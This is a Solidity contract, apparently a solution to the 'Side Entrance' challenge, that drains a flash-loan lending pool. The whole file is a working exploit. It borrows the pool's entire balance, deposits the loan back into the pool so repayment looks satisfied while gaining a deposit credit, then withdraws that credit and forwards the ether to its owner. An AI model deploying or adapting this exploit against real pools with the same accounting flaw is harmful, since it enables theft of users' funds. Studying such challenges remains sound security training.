// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface IPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}


contract SideEntranceAttack {
    using Address for address payable;

    address private owner;
    IPool private pool;

    constructor(address poolAddress) {
        pool = IPool(poolAddress);
        owner = msg.sender;
    }

    function attack(uint256 initialPoolBalance) external {
        pool.flashLoan(initialPoolBalance);

    }

    function execute() external payable {
        pool.deposit{value:msg.value}();
    }

    function withdrawFromPool() external {
        pool.withdraw();
    }

    function collectFunds() external {
        payable(owner).sendValue(address(this).balance);
    }

    receive() external payable {}

}
 